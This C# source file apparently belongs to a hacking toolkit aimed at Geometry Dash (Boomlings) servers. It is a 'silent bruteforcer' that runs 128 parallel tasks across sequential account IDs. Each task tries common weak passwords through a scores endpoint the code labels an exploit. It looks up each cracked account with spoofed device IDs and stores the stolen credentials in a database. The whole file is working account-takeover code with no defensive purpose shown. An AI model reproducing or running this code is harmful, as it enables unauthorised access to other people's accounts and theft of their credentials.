using GDTools.Scenes;
using log4net;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace GDTools.Armitage {
    public class Silent_Bruteforcer : Auto_Start {

        private static readonly ILog Logger = LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);

        private List<string> passwords = new() {
            // verified via sweat and blood
            "robtop",  "qwerty", "password"
        };

        private List<Task> bruteforcers = new();

        private const int maxTasks = 128;
        public async Task StartAsync() {
            Logger.Info($"Silent bruteforcer started at AccID {Database.Database.BruteForcerCurrentID} at {maxTasks} threads...");

            for (int i = 0; i < maxTasks; i++) {
                bruteforcers.Add(bruteforce());
            }

            Debug.WriteLine($"Bruteforcers added {bruteforcers.Count}");
            // make sure not to end to early
            foreach (var bruteforcer in bruteforcers) {
                await bruteforcer;
            }
        }

        public async Task bruteforce() {
            // this is a thread
            while (true) {
                int accountID = Database.Database.BruteForcerNextAccountID();
                // got account id, now test passwords on it
                foreach (var password in passwords) {
                    // attempt to log in each password
                    var getGJScores20Exploit = new Core.Boomlings_Networking.Get_GJ_Scores_20(accountID, password);
                    var result = await getGJScores20Exploit.GetScores();

                    if (result.IsSuccess) {
                        Logger.Debug($"Bruteforced account, accountID: {accountID} password: {password}...");
                        // get userinfo
                        var generatedUDID = Utilities.Random_Generator.RandomUDID();
                        var generatedUUID = Utilities.Random_Generator.RandomUUID();
                        var userInfoEx = new Core.Boomlings_Networking.Get_GJ_User_Info(accountID, generatedUDID, generatedUUID);
                        var userInfo = await userInfoEx.GetUserInfoAsync();

                        if (userInfo != null) {
                            var username = userInfo?.Username;
                            var playerID = userInfo?.PlayerID;
                            Database.Database.AddAccount(new Core.Boomlings_Networking.Account_Data_Result {
                                AccountID = accountID,
                                PlayerID = playerID.Value,
                                UDID = generatedUDID,
                                UUID = generatedUUID
                            }, username, password, "silentbruteforcer");
                        } else {
                            Logger.Debug($"Server returned null on GetGJUserInfo...");
                        }

                        // move on to the next accountid
                        break;
                    }

                }
            }
        }
    }
}
